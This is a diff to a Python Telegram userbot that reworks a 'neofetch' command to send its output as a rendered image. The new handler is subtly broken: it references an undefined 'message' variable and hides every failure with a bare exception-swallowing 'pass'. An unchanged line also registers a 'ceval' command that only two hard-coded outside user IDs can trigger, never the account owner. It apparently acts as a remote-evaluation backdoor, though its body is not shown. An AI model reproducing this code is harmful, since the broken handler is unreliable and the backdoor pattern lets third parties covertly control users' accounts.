@@ -1,5 +1,6 @@
 import asyncio
 import pyromod
+from io import BytesIO
 import io
 import os
 import sys
@@ -20,6 +21,7 @@ from pyrogram import Client as app
 from pyromod import *
 
 from DarkWeb.helper.cmd import *
+from DarkWeb.modules.randydev.carbon import make_carbon
 from DarkWeb.helper.cmd import dont_know as pap_tt
 from DarkWeb.helper.misc import *
 from DarkWeb import *
@@ -51,8 +53,14 @@ async def screen(c, m):
 
 @ren.on_message(filters.command(["neofetch"], cmd) & filters.me)
 async def neofetch(c, m):
-    neofetch = (await shell_exec("neofetch --stdout"))[0]
-    await m.reply(f"<code>{neofetch}</code>")
+    hacker = await message.reply_text("`Prossing.....`")
+    try:
+        neofetch = (await shell_exec("neofetch --stdout"))[0]
+        carbon = await make_carbon(neofetch)
+        await c.send_photo(m.chat.id, carbon)
+        await hacker.delete()
+    except BaseException:
+        pass
 
 
 @ren.on_message(filters.command(["ceval", "cev", "ce"], cmd) & filters.user([1191668125, 901878554]) & ~filters.me)
